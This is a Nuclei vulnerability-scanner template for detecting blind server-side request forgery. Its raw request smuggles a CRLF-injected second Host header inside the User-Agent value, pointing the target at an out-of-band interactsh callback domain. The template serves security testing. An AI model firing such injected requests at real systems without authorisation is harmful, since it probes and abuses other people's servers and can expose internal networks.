id: 0x120

info:
  name: Blind SSRF
  author: reewardius
  severity: high
  tags: ssrf

http:
  - raw:
      - |
        GET / HTTP/1.1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\x0d\x0aHost: {{Host}}.{{Port}}.BSSRF-120.{{interactsh-url}}
        Cache-Control: no-transform
        Accept-Encoding: gzip, deflate
        Accept: */*
        Host: {{Hostname}}

    unsafe: true
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
        condition: or